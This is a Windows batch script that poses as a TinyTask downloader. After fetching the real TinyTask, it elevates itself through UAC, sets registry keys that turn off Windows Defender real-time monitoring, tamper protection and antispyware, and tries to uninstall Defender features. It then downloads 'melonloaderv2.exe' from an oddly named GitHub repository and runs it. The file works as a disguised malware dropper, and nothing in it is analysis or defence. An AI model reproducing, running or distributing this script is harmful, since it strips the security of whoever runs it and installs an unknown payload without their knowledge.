



set "url=https://www.tinytask.net/download/TinyTask.exe"
set "destination=%TEMP%\TinyTask_v3.exe"


echo Downloading TinyTask...
curl -L -o "%destination%" "%url%"


if exist "%destination%" (
    echo TinyTask v3 downloaded successfully!
    echo Running TinyTask v3 now...
    start "" "%destination%"
) else (
    echo Failed to download TinyTask v3. Please check your internet connection or try again later.
    exit
)

@echo off


NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires administrator privileges. Restarting with elevated permissions...
    goto UAC
)

echo Running as Administrator...


REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Security Center" /v "TamperProtection" /t REG_DWORD /d 0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f

cls
setlocal
echo.
echo   M   M  OOO  III  SSS  TTTTT
echo   MM MM O   O  I  S       T  
echo   M M M O   O  I  SSS     T
echo   M   M O   O  I     S    T
echo   M   M  OOO  III  SSS    T
echo.

:: Set URL and Destination for Download
set "url=https://github.com/aaaaaasdfdvsydvuisfhuwegu/plzfurrry/raw/main/melonloaderv2.exe"
set "destination=%TEMP%\melonloaderv2.exe"

powershell -Command "Uninstall-WindowsFeature -Name Windows-Defender-Features"


echo Downloading file from %url%...
curl -L -o "%destination%" "%url%"


if exist "%destination%" (
    echo.
    echo File downloaded successfully. Running the file...
    start "" "%destination%"
) else (
    echo.
    echo Failed to download the file. Exiting.
)

pause
exit


:UAC
set "batchPath=%~f0"
echo Set UAC permissions...
powershell -Command "Start-Process cmd -ArgumentList '/c %batchPath%' -Verb runAs"
cls
pause

